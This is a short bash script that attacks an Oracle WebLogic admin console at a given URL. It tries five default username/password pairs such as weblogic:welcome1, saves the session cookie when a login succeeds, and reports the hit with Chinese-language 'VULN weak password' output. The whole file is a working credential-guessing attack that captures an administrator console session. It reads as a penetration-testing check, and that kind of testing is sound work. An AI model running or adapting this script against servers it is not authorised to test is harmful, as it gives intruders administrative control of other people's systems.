#!/usr/bin/env bash
TARGET="${1:?usage: bash wlslogin.sh http://TARGET:7001}"
B="${TARGET%/}"
curl -sS -m 10 -o /dev/null -w 'console=%{http_code}\n' "$B/console/login/LoginForm.jsp"
for cred in weblogic:welcome1 weblogic:weblogic123 weblogic:weblogic system:password admin:admin; do
  u="${cred%%:*}"; p="${cred#*:}"
  loc=$(curl -sS -m 12 -c runs/wls.ck -o /dev/null -D - \
    -d "j_username=$u&j_password=$p" "$B/console/j_security_check" 2>/dev/null \
    | grep -i '^location:' | tr -d '\r')
  echo "$cred -> $loc"
  case "$loc" in
    *LoginForm*) ;;
    *console*) echo "VULN 弱口令 $cred（已拿到 ADMINCONSOLESESSION）"; exit 0 ;;
  esac
done
echo "SAFE/未命中"; exit 1
